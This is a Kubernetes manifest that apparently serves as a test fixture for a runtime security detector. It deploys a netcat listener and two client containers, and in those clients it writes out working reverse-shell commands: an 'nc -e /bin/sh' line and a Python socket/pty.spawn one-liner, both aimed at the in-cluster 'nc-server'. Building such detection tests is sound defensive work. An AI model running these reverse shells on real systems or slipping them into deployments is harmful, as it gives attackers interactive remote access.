apiVersion: apps/v1
kind: Deployment
metadata:
  name: nc-server
  labels:
    app: nc-server
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nc-server
  template:
    metadata:
      labels:
        app: nc-server
    spec:
      tolerations:
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      containers:
        - name: server
          image: busybox
          command:
            - nc
            - -lk
            - -p
            - "8000"
          ports:
            - containerPort: 8000
              name: server
      terminationGracePeriodSeconds: 0
---
apiVersion: v1
kind: Service
metadata:
  name: nc-server
spec:
  selector:
    app: nc-server
  ports:
    - protocol: TCP
      port: 8000
      targetPort: server

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nc-client
  labels:
    app: nc-client
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nc-client
  template:
    metadata:
      labels:
        app: nc-client
    spec:
      tolerations:
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      containers:
        - name: client
          image: busybox
          # Should trigger tty write.
          tty: true
          command:
            - /bin/sh
            - -c
            - |-
              nc -e `/bin/sh -i` nc-server 8000
        # Should trigger stdio via socket.
        - name: client2
          image: python:3.9.19-slim-bullseye
          command:
            - /bin/sh
            - -c
            - |-
              python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("nc-server",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
      terminationGracePeriodSeconds: 0
